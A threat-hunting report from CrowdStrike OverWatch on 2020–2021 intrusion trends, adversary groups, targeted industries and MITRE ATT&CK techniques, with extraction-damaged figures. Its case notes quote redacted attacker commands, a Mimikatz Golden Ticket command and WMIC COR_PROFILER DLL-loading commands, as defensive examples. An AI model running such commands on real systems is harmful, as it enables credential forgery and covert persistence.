OverWatch conducts thorough\nhuman analysis on a 24/7/365 basis to relentlessly hunt for anomalous or\n\n#### F\n\nnovel attacker tradecraft designed to evade other detection techniques.\n\nOverWatch is an elite cross-disciplinary team that harnesses the power of the\nCrowdStrike Threat Graph® database, enriched with CrowdStrike threat intelligence,\nto continuously hunt for threat activity in customer environments. Armed with\ncloud-scale telemetry of upward of 1 trillion endpoint-related events collected per\nday, and detailed tradecraft on more than 160 adversary groups, OverWatch has\nthe unparalleled ability to see and stop the most sophisticated threats — leaving\nadversaries with nowhere to hide.[1]\n\n1 For more information on how Falcon OverWatch performs its mission, please see\nhttps://www.crowdstrike.com/endpoint-security-products/falcon-overwatch-threat-hunting/.\n\n\n-----\n\n###### Executive Summary\n\n\n###### This report shares insights into the latest adversary tradecraft, gleaned from OverWatch’s extensive intrusion dataset.\n\n\nor yet another year, OverWatch disrupted a record number of interactive\nintrusion attempts[2] by identifying malicious activity early and stopping\nadversaries in their tracks. This report shares insights from OverWatch’s\n\n#### F\n\naround-the-clock threat hunting from July 1, 2020 through June 30, 2021.[3]\n\nThis year's report starts with a close look at OverWatch's extensive dataset covering\nobserved interactive threat actor behaviors, which we will refer to in this report as\n\"intrusion activity\". It uses this data to examine how threat actors are operating in\nvictim environments, highlighting both rare and common techniques that adversaries\nare employing.\n\nThe mission of OverWatch is to augment the powerful autonomous protection of the\nFalcon platform with human expertise. With the combined power of human ingenuity\nand patent-protected work flows, OverWatch systematically sifts through 1 trillion\ndaily events to find potential hands-on intrusions, on average 1 every 8 minutes.\nOverWatch operates with speed and at scale to notify victim organizations of\nmalicious activity in near real time, ensuring intrusion attempts that incorporate novel\ntradecraft are identified and disrupted before the breach.\n\nKey findings from this year’s report include:\n\n\u0007OverWatch has tracked a 60% increase in interactive intrusion activity in\nthe past year. The threat of hands-on intrusion activity remains very real —\nOverWatch has observed and disrupted intrusions spanning all industry verticals\nand geographic regions.\n\n\u0007Adversaries have moved beyond malware. They are using increasingly\nsophisticated and stealthy techniques tailor-made to evade autonomous\ndetections — of all of the detections indexed by CrowdStrike Threat Graph® in\nthe past three months, 68% were malware-free.\n\n\u0007ECrime continues to dominate the threat landscape, making up 75% of\ninteractive intrusion activity. One driver of this has been the continually evolving\nbig game hunting (BGH) business model, which has seen the widespread\nadoption of both the use of access brokers to facilitate access, and the use of\ndedicated leak sites to extract payment.\n\n\u0007ECrime adversaries are moving with increasing speed in pursuit of their\nobjectives. OverWatch observations show they are capable of moving laterally\nwithin a victim environment in an average of 1 hour and 32 minutes.\n\n\u0007Targeted intrusion adversaries remain a prominent threat, particularly for the\ntelecommunications industry. While organizations of all sizes and in all verticals\nhave the potential to become a target, the telecommunications industry stood\nout this year, accounting for 40% of all state-nexus intrusion activity observed by\nOverWatch in the past 12 months.\n\n2 The term “interactive” denotes hands-on adversary activity.\n3 \u0007The terms “this year” or “this past year” used throughout the report refer to the period from July 1, 2020\nto June 30, 2021.\n\n\n-----\n\nThis report features detailed case studies sharing insights into the hands-on activity\nthat OverWatch tracks on a daily basis and concludes with recommendations for\ndefenders looking to bolster their security program.\n\nNote that this report’s findings relate to interactive (i.e., hands-on) targeted\nintrusions[4] and eCrime intrusions that OverWatch tracks and are not necessarily\nrepresentative of the full spectrum of attacks that are stopped by OverWatch or the\nFalcon platform.\n\nMoreover, the term “intrusion” is used to describe any malicious interactive activity\nthat OverWatch uncovers in a victim environment. The term “intrusion” is not\nsynonymous with a “security breach” and should not be understood to mean that\nthe threat actor was able to achieve their objectives.\n\n4 \u0007The term “targeted intrusion” in this report refers to state-nexus or other advanced persistent threat actors.\n\n\n-----\n\n###### The Value of Continuous Threat Hunting\n\n\n###### OverWatch is on a mission to find threats that technology on its own cannot.\n\n\nhe CrowdStrike Falcon platform has proven unequivocally in dozens of\nindependent tests to be a highly effective solution for protecting endpoints\nfrom modern threats. Still, no technology is 100% effective at blocking\n\n#### T\n\ndetermined intruders.\n\nAccording to data from our customer base indexed by Threat Graph, 68% of\ndetections from the last three months were not malware-based. Attackers are\nincreasingly attempting to accomplish their objectives without writing malware to the\nendpoint, using legitimate credentials and built-in tools (living off the land) — which are\ndeliberate efforts to evade detection by traditional antivirus products.\n\n###### 68% of detections from the last three months were not malware-based\n\nOverWatch is on a mission to find threats that technology on its own cannot.\n\nThreat hunting takes place at the front lines of the battle between adversaries and\ndefenders. Each year OverWatch sees more adversaries, new tradecraft and faster\nintrusions. In this context, finding the threat is only half the battle; using those insights\nto disrupt adversaries at scale is where the battle is won.\n\nIn the 12 months from July 1, 2020 to June 30, 2021, OverWatch’s human threat\nhunters directly identified more than 65,000 potential intrusions, or approximately\n1 potential intrusion every 8 minutes — 24 hours a day, 365 days a year. This\nrepresents thousands of instances where OverWatch analysts uncovered adversaries\nactively seeking to evade autonomous detection techniques. When considered\nalongside adversaries’ demonstrated ability to begin moving through victim\nenvironments in just minutes — shown throughout this report — these numbers drive\nhome the criticality of continuous threat hunting.\n\n\n###### 65,000\n\npotential intrusions were identified\nand stopped with the help of Falcon\nOverWatch\n\n\n###### 8 minutes \n\nis the average interval at which\nOverWatch threat hunters uncovered\npotential intrusions\n\n\n-----\n\nCrucially, each of these potential intrusions also represents an opportunity to advance\nthe autonomous detection techniques in the Falcon platform. With each pass through\nthe OverWatch SEARCH threat hunting cycle, hunters hone the Falcon platform’s\nability to detect similar intrusions more quickly and autonomously. Over the last\nyear, threat hunters distilled their findings into the development of hundreds of new\nbehavioral-based preventions, resulting in the direct prevention of malicious activity\non approximately 248,000 unique endpoints. These behavioral-based preventions\nenhance the power of the Falcon platform to uncover novel adversary behavior with\ngreater speed and scale.\n\nWith the right data and tools, a small team of experts can not only stop today's most\nsophisticated intrusions but also develop insights that drive continuous advancement\nat every level of the security organization.\n\n\n-----\n\n###### OverWatch SEARCH Hunting Methodology\n\nverWatch finds threats that technology on its own cannot.\n\nHuman-led threat hunting does not replace autonomous detection\n\n#### O technologies — rather, it explicitly sets out to complement and augment\n\ntechnology-based defenses to ensure that defenders have the power of human\ningenuity on their side.\n\n\nOverWatch threat hunters employ the “SEARCH” hunting methodology, described\nbelow, to systematically detect threats at scale. Working around the clock,\nOverWatch threat hunters methodically sift through a world of unknown unknowns\nto find the faintest traces of malicious activity and deliver actionable analysis to\nCrowdStrike customers in near real time. The OverWatch SEARCH methodology\nshines a light into the darkest corners of customers’ environments — leaving\nadversaries with nowhere to hide.\n\n### OVERWATCH SEARCH\n###### Threat Hunting Methodology\n\n SENSE ENRICH ANALYZE RECONSTRUCT COMMUNICATE HONE\n\n\n-----\n\n###### Analyze\n\n Reconstruct\n\n Communicate\n\n Hone\n\n\nCrowdStrike’s rich telemetry creates the foundation for OverWatch threat hunting.\nUpward of 1 trillion events per day, comprising hundreds of event types from\nmillions of endpoints, are collected and cataloged by the Falcon platform to provide\ncomprehensive visibility into activity across the CrowdStrike install base.\n\nCrowdStrike's proprietary Threat Graph contextualizes events and reveals relationships\nbetween data points in real time. Threat hunters add a further dimension to the data by\ndrawing on CrowdStrike’s up-to-the-minute threat intelligence about the tradecraft of\nmore than 160 adversary groups, as well as by using their intimate working knowledge\nof the tactics, techniques and procedures (TTPs) in use in the wild. All of this is\nunderpinned by OverWatch’s proprietary tools and processes, which ensure every hunt\nis optimized for maximum efficiency.\n\nOverWatch analysts use a mix of patent-protected hunting workflows and complex\nstatistical methods to identify anomalous activity. This is supported by a deep\nunderstanding of adversary behaviors and motivations, enabling the team to form\nhypotheses about where adversaries may strike. The breadth and depth of experience\non the OverWatch team is world class, with representation from every corner of public\nand private industry. Further, the team is continuously building its knowledge base,\ngoing toe-to-toe with adversaries on the front lines, 24/7/365.\n\nIn order to take action against an adversary, it is critical to understand the full nature of\nthe threat. In just minutes, OverWatch analysts reconstruct threat activity, transforming\nit from a collection of data points into a clear story. This information empowers\norganizations to not only remediate but also plug the gaps in their environment.\n\nTime is of the essence in preventing an intrusion from becoming a breach. OverWatch\noperates as a native component of the Falcon platform. Through Falcon, OverWatch\ndelivers clear, accurate and actionable information on potentially malicious activity in\nnear real time, enabling organizations to respond quickly and decisively, without friction.\n\nWith each new threat, OverWatch extracts new insights to drive continuous\nadvancements in automated detections and human threat hunting. The team is\nconsistently fine-tuning its skills and processes to always stay a step ahead of the\nadversary.\n\n\n-----\n\n###### Intrusion Campaigns Summary\n\n Intrusion Campaign Numbers\n\nOver the past year, OverWatch tracked steadily increasing numbers of interactive\nintrusion campaigns. Year over year, OverWatch observed a near 60% increase in the\nnumber of campaigns. In the most recent quarter, from April to June 2021, OverWatch\nuncovered more intrusion campaigns than in any other quarter.\n\n###### Adversary Motives\n\nFor yet another year, financially motivated eCrime activity dominated the interactive\nintrusion attempts tracked by OverWatch. ECrime accounted for 75% of the interactive\nintrusion activity, while targeted intrusions accounted for 24% and the remaining 1%\nwas attributed to hacktivist activity.\n\n**eCrime** Financially motivated criminal intrusion activity\n\nState-sponsored intrusion activity that includes cyber espionage, state-nexus\n**Targeted**\ndestruction attacks and currency generation to support a regime\n\nIntrusion activity undertaken to gain momentum, visibility or publicity for a\n**Hacktivist**\ncause or ideology\n\nThese figures track closely with the distribution of activity seen in the previous year.\nSeeing these figures stabilize indicates that the distribution of eCrime and targeted\nintrusion activity may be reaching an equilibrium after several years of eCrime activity\nrapidly expanding relative to targeted intrusions.\n\n###### Year over year, OverWatch observed a near 60% increase in the number of interactive intrusion campaigns.\n\n\n-----\n\n###### INTRUSION CAMPAIGNS BY THREAT TYPE July 2019 to June 2020 vs. July 2020 to June 2021\n\n Targeted Intrusion 24%\n\n Targeted Intrusion 23% Hacktivist 1%\n\n Hacktivist 1%\n\n 2020 2021\n\n eCrime 76% eCrime 75%\n\n**Figure 1. Relative distribution of targeted intrusion, eCrime and hacktivist activity uncovered by**\nOverWatch\n\n###### eCrime\n\nThere are signs that eCrime adversaries may be becoming more capable, particularly\nif measured by the speed at which they can move through a victim environment.\nOverWatch measures breakout time — the time an adversary takes to move laterally,\nfrom an initially compromised host to another host within the victim environment.\nOf the hands-on eCrime intrusion activity from July 1, 2020 to June 30, 2021 where\nbreakout time could be derived, the average was just 1 hour 32 minutes. Moreover, the\nOverWatch team found that in 36% of those intrusions, the adversary was able to move\nlaterally to additional hosts in less than 30 minutes.\n\nECrime adversaries also continue to innovate and evolve their business models to\nincrease their chance of success. The majority of ransomware operators engaged in\nbig game hunting (BGH) activity have now adopted the threat of data leaks alongside\ndata encryption as a means to extract payment from victims. Many adversaries have\nalso established dedicated leak sites (DLSs) as a forum to publicize victim details and\nrelease the stolen data. INDRIK SPIDER is an exception to this trend toward the use of\ndata extortion.\n\nAnother feature of the eCrime threat landscape in the past 12 months is the growing\nimportance of access brokers who play a role in facilitating access for other eCrime\nactors to stage their intrusions. The feature story In Pursuit of PROPHET in this report\ntakes a look at access brokers in action.\n\n\n###### 23% Hacktivist 1%\n\n 2021\n\n\n###### 1%\n\n\n-----\n\n###### 20%\n\n\nOverWatch also recorded a 100% increase in instances of cryptojacking in interactive\nintrusions year over year. This was likely driven by steep increases in cryptocurrency\nvalues beginning in late 2020.\n\nThe potential for growth in eCrime activity is almost limitless, propelled by new actors,\nnew vulnerabilities or failures on the part of organizations to maintain basic security\nhygiene. While OverWatch indeed saw an increase in the number of eCrime intrusion\nattempts over the past 12 months, this growth did not outpace the growth in targeted\nintrusion activity to the degree seen in previous years.\n\nOne factor that may have stemmed the rapid acceleration of eCrime activity\nis successful interventions by law enforcement against adversary-controlled\ninfrastructure and resources. These efforts touched the operations of several\nprominent eCrime groups including WIZARD SPIDER, MUMMY SPIDER, CIRCUS\nSPIDER, GRACEFUL SPIDER, TWISTED SPIDER and CARBON SPIDER. Law\nenforcement activity, however, appears to only temporarily disrupt eCrime activity,\nrather than halting operations altogether. Adversaries have shown resilience by quickly\nactivating new C2 infrastructure and diversifying their toolsets.\n\n###### Targeted Intrusion\n\nGenerally, adversary groups from the People’s Republic of China, the Democratic\nPeople’s Republic of Korea (DPRK, aka North Korea) and the Islamic Republic of\nIran are the source of the majority of targeted intrusion[5] activity OverWatch tracks.\nHowever, in the past year, OverWatch also tracked an uptick in suspected state-nexus\nactivity not attributed to named actor groups.\n\n###### 5% [1% 1%]\n\n 7%\n\nPANDAs (China)\n\nSUSPECTED STATE-SPONSORED (Not Attributed)\nKITTENs (Iran)\nCHOLLIMAs (North Korea)\nBEARs (Russia)\nBUFFALOs (Vietnam)\n\n###### 67%\n\n**Figure 2. Proportion of targeted intrusion activity conducted by different targeted adversary**\ngroups, July 2020 to June 2021\n\n5   Again, the term “targeted intrusion” in this report refers to state-nexus or other advanced persistent\nthreat actors.\n\n\n###### 7%\n\n 67%\n\n\n-----\n\nIn the year leading up to June 30, 2021, Chinese state-nexus adversaries (aka PANDAs)\nmaintained a high operational tempo and conducted sustained and wide-ranging\ncampaigns motivated both by intellectual property (IP) theft and intelligence gathering\nobjectives. PANDAs were among the targeted intrusion adversaries most commonly\nuncovered by OverWatch threat hunters during this period.\n\nA notable development in early 2021 was the mass exploitation of Microsoft Exchange\nServer vulnerabilities by suspected China-nexus adversaries. This serves as a reminder\nof the diverse skill sets of China-nexus actors and highlights the ever-present threat of\nnew vulnerabilities being found and exploited. A story later in this report — OverWatch\n_Disrupts Microsoft Exchange Zero-Day Exploits with Falcon Complete — examines_\nhow CrowdStrike’s managed services worked together to disrupt and expel an as-yetunnamed threat.\n\nOverWatch tracked relatively consistent levels of activity attributed to North Korea\n(CHOLLIMAs). CrowdStrike Intelligence reports that North Korean actors — including\ntwo actors tracked by OverWatch in the past 12 months, LABYRINTH CHOLLIMA and\nSILENT CHOLLIMA — continue to make iterative updates and improvements to their\ntoolsets. An intrusion story later in this report — Custom Tooling Rings Alarm Bells in\n_Intrusion by (Not So) SILENT CHOLLIMA — sheds light on how some of this custom_\ntooling has been used in the wild.\n\nIn contrast to the observed China-nexus and DPRK adversary activity, OverWatch saw\na downturn in activity stemming from Iran (KITTENs). CrowdStrike Intelligence reports\nthat in 2020, many of Iran’s observed intrusion efforts focused on targets related\nto narrower geopolitical and domestic concerns; this may have contributed to the\nreduction in campaigns seen by OverWatch.\n\nOverWatch also uncovered a number of intrusion campaigns with all of the hallmarks\nof state-nexus activity, but that cannot at this time be attributed to any of the named\nadversary groups tracked by CrowdStrike Intelligence. Much of this activity targeted\nthe telecommunications industry, explored in detail in the Signal Interference feature\nlater in this report. This increase in activity attributable to diverse and globally\ndispersed mission clusters underscores the variety of targeted intrusion threats that\nexist in the current threat landscape.\n\n###### Hacktivism\n\nHacktivism accounted for only a small fraction of the interactive activity tracked by\nOverWatch. All hacktivist activity seen by OverWatch has been attributed to a single\nadversary group — FRONTLINE JACKAL, an Iranian nationalist hacktivist group known\nto deface websites and carry out other disruptive online activity targeting U.S., Israeli\nand Saudi Arabian organizations. Adversary activity observed by OverWatch provided\nCrowdStrike Intelligence with additional visibility into this group’s operating procedures.\n\n###### Intrusions by Industry Vertical\n\nFigure 3 shows the top 10 industry verticals that featured most frequently in the\ninteractive intrusion activity uncovered by OverWatch from July 2020 to June 2021.\nThe same 10 industries also made up the top 10 list for the 12-month period from July\n2019 to June 2020. Notably, the technology industry has now held the top spot for the\npast three years.\n\n\n-----\n\n###### TOP 10 VERTICALS BY INTRUSION FREQUENCY July 2020 to June 2021\n\n Change relative to July 2019 to June 2020\n\nTechnology\n\nTelecommunications\n\nManufacturing\n\nFinancial\n\nProfessional Services\n\nAcademic\n\nHealthcare\n\nRetail\n\nGovernment July 2020 to June 2021\n\nJuly 2019 to June 2020\n\nEngineering\n\n0% 5% 10% 15% 20%\n\n**Figure 3. The figure shows which industry verticals were most frequently impacted by interactive**\nintrusions and also shows any changes relative to the period from July 2019 to June 2020\n\nWhile Figure 3 shows the prevalence of intrusion activity against particular industries\nwithin the OverWatch data, it does not illustrate the significant overall growth in\nthe number of intrusions. As noted at the start of this report, total intrusion activity\nobserved by OverWatch increased by approximately 60% year over year — and the\ngrowth in intrusion activity within several of the industries in this top 10 list exceeded\nthat rate of increase.\n\nA year-over-year comparison of the total number of intrusion attempts that OverWatch\nobserved finds that intrusions targeting the telecommunications and retail industries\nmore than doubled. The professional services industry saw a more than 90% increase\nin interactive intrusion numbers, while the government and academic sectors both saw\nintrusion numbers increase by more than 80%.\n\nThe ranking of the top industries changes when the data is broken out by threat\ntype, specifically targeted intrusion vs. eCrime activity. Figure 4 shows the top five\nindustries most frequently impacted by interactive intrusions carried out by targeted\nintrusion and eCrime adversaries respectively.\n\n|Col1|Col2|July 2020 t July 2019 to|o June 2021 June 2020|\n|---|---|---|---|\n\n\n-----\n\n###### TOP 5 VERTICALS BY INTRUSION FREQUENCY Targeted Intrusion vs. eCrime Activity, July 2020 to June 2021\n\n TARGETED INTRUSIONS\n\nTelecommunications\n\nTechnology\n\nHealthcare\n\nGovernment\n\nAcademic\n\n0% 5% 10% 15% 20% 25% 30% 35% 40% 45% 50%\n\n###### eCRIME\n\nTechnology\n\nManufacturing\n\nProfessional Services\n\nFinancial\n\nRetail\n\n0% 5% 10% 15% 20% 25% 30% 35% 40% 45% 50%\n\n**Figure 4. Comparison of the industry verticals most frequently impacted by targeted intrusion vs.**\neCrime threat actors. July 2020 to June 2021\n\nThe telecommunications industry notably accounted for 40% of all targeted intrusion\nactivity uncovered by OverWatch in the 12 months to June 30, 2021, explored in detail\nin the Signal Interference feature later in this report. Other notable inclusions in the\ntargeted intrusion “Top 5” are the healthcare and academic industries, which fell victim\nto ongoing targeting over the reporting period, particularly due to their involvement in\nCOVID-19 related research.[6]\n\nECrime intrusions, in contrast, were more evenly distributed across industry verticals.\nThis is indicative of the opportunistic nature of much of eCrime activity, which leads to\na much wider spread of activity across diverse industry verticals.\n\n6   To read more about targeting of COVID-19 research, see the 2021 CrowdStrike Global Threat Report,\nand the CrowdStrike blog Don’t Get Schooled: Understanding the Threats to the Academic Industry.\n\n\n-----\n\n###### Adversary Activity\n\nIn the year to June 30, 2021, OverWatch uncovered interactive intrusion activity\nconducted by 30 distinct named threat actor groups. In addition, threat hunters\nuncovered an extensive array of activity suspected of being eCrime or targeted\nintrusion activity, but not specifically tied to a named group.\n\nFigure 5 provides a breakdown of the adversaries observed by OverWatch. ECrime\nactivity was by far the most widespread across industry verticals, followed by intrusions\nconducted by PANDA adversaries.\n\nOverWatch uncovered activity by 13 named eCrime (aka SPIDER) adversary groups.\nOf these groups, WIZARD SPIDER[7] was the most prolific, with nearly twice as many\nintrusion attempts than any other eCrime group observed by OverWatch. WIZARD\nSPIDER deployed the Cobalt Strike Beacon in more than half of these intrusions; other\ncommonly seen tools included Ryuk ransomware, the Windows backdoor access tool\nBazarLoader and the Active Directory discovery tool AdFind.\n\nFor targeted intrusion activity, intrusions attributed to People’s Republic of China (aka\nPANDA) actors were the most common. OverWatch uncovered intrusion attempts\nby eight separate named China-nexus adversaries, with WICKED PANDA[8] being the\nmost active. WICKED PANDA also frequently deployed Cobalt Strike using bespoke\nloaders such as AttachLoader while also deploying the custom Winnti, ShadowPad and\nRouterGod backdoors.\n\nA few things to note about the data presented in Figure 5:\n\n\u0007The heat mapping represents the number of distinct actors active within a particular\nvertical.\n\n\u0007The heat mapping does not represent the total number of intrusion attempts within a\nvertical, as multiple intrusions by the same adversary group are only represented once.\n\n\u0007Attribution to a high degree of confidence is not always possible. This table does\nnot reflect any unattributed activity that occurred in any of the industry verticals.\n\n\u0007Verticals not listed in this chart indicate that OverWatch did not record any\nintrusions attributable to a specific actor group during this period.\n\n7 To learn more about WIZARD SPIDER, check out the CrowdStrike Adversary Universe.\n8 To learn more about WICKED PANDA, check out the CrowdStrike Adversary Universe.\n\n\n-----\n\nProfessional Services\n\nRail\n\nReal Estate\n\nRetail\n\nServices\n\nTechnology\n\nTelecommunications\n\nThink Tanks\n\nTransportation & Logistics\n\n**Figure 5.

OverWatch carefully documents the\ndetails of each intrusion it uncovers, building a rich data set of adversary\n\n#### O\n\nactivity. With each new intrusion, threat hunters create a sharper picture of the\nthreat landscape and the tradecraft of the adversaries that inhabit it.\n\nThis data-driven analysis of adversary tradecraft seeks to better equip defenders to\ntake a proactive and evidence-informed approach to protecting their environment.\n\nThe analysis below draws on OverWatch’s rich repository of intrusion data collected\nover the past year. It begins with a visualization of interactive intrusion activity observed\nby OverWatch threat hunters in a MITRE ATT&CK® heat map. It then details the\ntechniques and tools encountered most often by OverWatch, thereby indicating where\ndefenders can potentially achieve the greatest return on hunting efforts. It goes on to\nexamine outliers in the data, highlighting the more novel and sophisticated techniques\nOverWatch uncovered.\n\n###### MITRE ATT&CK Heat Map\n\nOverWatch tracks interactive intrusion activity against the MITRE ATT&CK Enterprise\nMatrix. The following heat map illustrates the prevalence of adversary tactics,\ntechniques and sub-techniques observed by OverWatch threat hunters from\nJan. 1, 2021 to June 30, 2021.[9] This heat map represents activity seen in interactive\nintrusions only, and does not reflect the breadth of activity seen and stopped by the\nFalcon platform. This table excludes any techniques or sub-techniques not observed\nby OverWatch in this reporting period.\n\n9 While the rest of this report covers a 12-month period, the heat map only includes data from Jan. 1, 2021,\nwhen OverWatch began tracking against the latest MITRE ATT&CK matrix, which, among other changes,\nintroduced sub-techniques.\n\n\n-----\n\n###### MITRE ATT&CK HEAT MAP, 1 OF

MITRE ATT&CK heat map showing the techniques and sub-techniques observed by OverWatch in interactive**\nintrusion attempts from Jan. 1 to June 30, 2021\n\n\n-----\n\n###### Techniques and Tools: A Closer Look\n\nThere are no surprises among the most commonly observed techniques. In fact, the\nheat map in Figure 6 clearly illustrates that tried-and-true techniques serve as the\nfoundation for a significant proportion of the malicious interactive activity OverWatch\nobserves. The heat map thus serves as a guide to defenders, highlighting which\nfocus areas they should prioritize for the best return on their investment of time and\nresources.\n\nAs an example, building up hunting capabilities across discovery techniques can yield\nsignificant dividends. As a threat actor establishes a foothold, they commonly begin\nthe discovery process to better understand the victim organization’s domain, user\naccounts and system configurations. This is usually true regardless of the threat actor’s\nultimate intent. Discovery is a vital step to plan their next move, be it lateral movement,\ncollection or exfiltration.\n\nBecause many discovery activities fall well within what is “normal” administrative\nbehavior in an enterprise environment, it is crucial that any hunting leads are\naugmented by tooling and human expertise that will filter out likely false positives.\nHunters should prioritize the results from their hunting leads by focusing on\ninstances where multiple different discovery hunting leads trigger within a short\nperiod of time. A sudden “burst” of discovery actions may stand in contrast to\nadministrators or normal users, and often reflects an adversary quickly trying to\norient themselves in a network.\n\nIngress Tool Transfer is another of the techniques most commonly observed by\nOverWatch. It is therefore beneficial for defenders and hunters to know which tools are\nmost often used by threat actors. Table 1 shows the list of tools common across both\ntargeted intrusion and eCrime actors, as well as the top tools used exclusively by each\ngroup.\n\n**Top 5 Tools**\n\n**Common to Targeted**\n**Unique to Targeted Intrusion**\n**Intrusion Activity and** **Unique to eCrime Intrusions**\n**Activity**\n**eCrime Intrusions**\n\n1.

Here the data supports\nOverWatch's expectations around adversary motivations and tradecraft.\n\n###### eCrime\n\nDefense Evasion Impact\n\n\n**Resource Hijacking**\n\nPrivilege Escalation\nDefense Evasion\n\n**Process Injection: Dynamic-link**\n**Library Injection**\n\nCredential Access\n\n**Brute Force: Password**\n**Guessing**\n\nInitial Access\n\n**Drive-by Compromise**\n\nPrivilege Escalation\nDefense Evasion\n\n**Domain Policy Modification**\n\n\n**T1070.006**\n\n**T1574**\n\n**T1048**\n\n**T1056**\n\n**T1070.003**\n\n\n**Indicator Removal on Host:**\n**Timestomp**\n\nPersistence\nPrivilege Escalation\nDefense Evasion\n\n**Hijack Execution Flow**\n\nExfiltration\n\n**Exfiltration Over Alternative**\n**Protocol**\n\nCollection\nCredential Access\n\n**Input Capture**\n\nDefense Evasion\n\n**Indicator Removal on Host:**\n**Clear Command History**\n\n\n**T1496**\n\n**T1055.001**\n\n**T1110.001**\n\n**T1189**\n\n**T1484**\n\n\nTargeted intrusion actors leverage\ntechniques that are inherently more stealthy\nand focused on long-term access, such\nas Indicator Removal on Host and Clear\nCommand History. Further, use of Input\nCapture and Exfiltration over Alternative\nProtocol is illustrative of intelligence\ngathering objectives.\n\n\nOn the other hand, eCrime actors are\nopportunistic in their targeting, as\nevidenced by Brute Force and Drive-by\nCompromise techniques. Financial\nmotivations also come through clearly, as\na rise in cryptojacking operations in recent\nmonths has placed Resource Hijacking\nfirmly in this list.\n\n\n-----\n\n###### Expect the Unexpected: Five Uncommon Techniques That Underscore the Need for Comprehensive Hunting Capabilities\n\nThe analysis to this point has examined the techniques that are most prominent\nin the OverWatch data. Threat hunting really comes into its own, however, when\ndefending against the less-prevalent techniques that adversaries employ as part of\ntheir operations.\n\nThe analysis that follows examines some of the rare and notable techniques that\nOverWatch threat hunters uncovered among the activity observed over the past year.\n\n\n**Use Alternate Authentication Material: Pass the Ticket[10]** **T1550.003**\n\n\nUnidentified PANDA\n\n\nOnce an attacker has gained access to a domain controller, they can dump the SID\nand NTLM hash of a domain user with ticket granting privileges to create their own\nKerberos tickets for valid use across the domain.\n\n**What OverWatch Observed**\nA persistent threat actor used Mimikatz to create a Golden Ticket using harvested\ncredentials from the domain controller and immediately injected the newly created\nticket into their session for use. Mimikatz continues to show up in many of the intrusion\nattempts OverWatch identifies, as its versatility for both dumping and leveraging\ncredentials makes it a straightforward and effective tool for adversaries to employ.\n\nkerberos::golden /domain:[REDACTED] /sid:[REDACTED]\n/rc4:[REDACTED] /user:krb /ptt\n\nFor this attack to be successful, a threat actor must have already gained privileged\naccess to a domain controller on the network. Using this technique allows them\nto create tickets for nonexistent accounts, thereby obfuscating their access and\npotentially maintaining a foothold in the network.\n\n10 https://attack.mitre.org/techniques/T1550/003/\n\n\n-----\n\n**Hijack Execution Flow: COR_PROFILER[11]** **T1574.012**\n\n\nThreat actors can modify the COR_PROFILER environment variable to load a\nmalicious DLL into a .NET process that relies on the Common Language Runtime.\n\n**What OverWatch Observed**\nA suspected eCrime adversary exploited a web service on a Windows server and\ndownloaded a number of tools. They then used WMIC to create and modify the\nCOR_PROFILER and COR_ENABLE_PROFILING environment variables to load one\nof the downloaded malicious DLLs.\n\nwmic ENVIRONMENT create\nname=\"COR_ENABLE_PROFILING\",username=\"[REDACTED]\",VariableValue=\"1\"\nwmic ENVIRONMENT create\nname=\"COR_PROFILER\",username=\"[REDACTED]\",VariableValue=\"[REDACTED]”\n\nThis technique not only provides persistence, but if the .NET process that triggers\nit runs at a higher privilege, the attacker DLL will run at that privilege. Whether an\nattacker gained access to a system with valid account credentials or via an exploited\nservice, this technique may provide privilege escalation without requiring further\ncredential harvesting.\n\n\n**Compromise Client Software Binary[12]** **T1554**\n\n\nState-sponsored\n(Suspected)\n\n\nUpon gaining access to a network, adversaries can modify client software binaries\nfor persistence. Client software that can be compromised and used for this purpose\ninclude SSH, FTP, email clients and web browsers.\n\n**What OverWatch Observed**\nA suspected state-nexus adversary had compromised an environment prior to the\nvictim deploying Falcon. Once OverWatch established visibility, it became clear\nthat the adversary was well entrenched. Threat hunters observed the adversary\naccessing a Linux host via SSH using valid credentials. The adversary then used a\nrenamed tcsh Unix shell with the setuid bit set to elevate privileges and installed an\nalternative SSH server/client, which was a modified version of SSH. The software\nhad been altered to provide the capability of covertly logging credentials.\n\nWhile it is more common for adversaries to use existing tools or native utilities to\nachieve their objectives, in some cases modified software may prove to be the best\nway for an adversary to achieve their goal. It is important for defenders to monitor\nsoftware to ensure that signatures remain valid. It is also important to be alert to\nunusual behavior stemming from client applications.\n\n11 https://attack.mitre.org/techniques/T1574/012/\n12 https://attack.mitre.org/techniques/T1554/\n\n\n-----\n\n**Cloud Service Discovery[13]** **T1526**\n\n\nAfter gaining initial access to a network, an adversary may attempt to perform\nreconnaissance on cloud services running on a host or enabled in the environment.\nThis can take several of different forms due to the range of services across various\ncloud providers.\n\n**What OverWatch Observed**\nOver the past year, OverWatch observed an increase in discovery actions focused\nspecifically on cloud services. For example, OverWatch identified a suspected\nRussian state-nexus adversary exploiting a Windows host via spearphishing. When\nthe adversary accessed the system, they initially performed basic reconnaissance. In\ndoing so, they recognized the device was joined to Azure Active Directory. To perform\nadditional discovery on this Azure cloud-based service, they executed the\ndsregcmd /status command, which provides several details related to the join\nstatus of the host.[14] While this may seem relatively straightforward, hunting for this type\nof behavior can be a valuable hunting lead for networks integrated with cloud services.\n\nOverWatch has been seeing an increase in cloud service discovery activities due\nto rapid adoption of cloud services, warranting increased attention from defenders.\nAs noted, discovery activities are often a foundational stage in hands-on intrusions.\nDefenders should be particularly vigilant in investigating any discovery activity that\nfalls outside of what is generally expected in their environment.\n\n\n**Supply Chain Compromise[15]** **T1195**\n\n\nState-sponsored\n(Suspected)\n\n\nAdversaries are known to target specific organizations, not as an end goal but as a\nway to gain access to organizations in that victim’s supply chain. This can take the\nshape of maliciously modifying a product prior to its delivery to a final user, inserting a\nbackdoor or compromising the software to facilitate later delivery of malware.\n\n**What OverWatch Observed**\nFollowing the deployment of Falcon in a technology company’s environment, OverWatch\nhunters uncovered evidence of a deeply embedded hands-on intrusion. Hunters tracked\nthe activity and found that the adversary was using compromised credentials to access\nan internal code sharing repository. The source code within the repository was used for\na legitimate software product that the victim delivered to its customers. The adversary\nused this compromised account to perform discovery and file interaction related to\nthis repository, providing them the potential opportunity to maliciously manipulate the\nsoftware before delivery to end users. In this case, the organization’s deployment of\nFalcon along with OverWatch proactive threat hunting, proved timely in disrupting an\nongoing active intrusion and preventing follow on actions on objectives.\n\nAs demonstrated in many high-profile cases, supply chain compromises can have\nwidespread implications. In this case, the consumers of this compromised software\nproduct could have been vulnerable to exploitation had OverWatch hunting not identified\nthe adversary’s subtle attempts to leverage valid accounts for accessing source code.\n\n13 https://attack.mitre.org/techniques/T1526/\n14 https //docs microsoft com/en us/azure/active directory/devices/troubleshoot device dsregcmd\n\n\n-----\n\n###### In Pursuit of PROPHET\n\nrom developers to 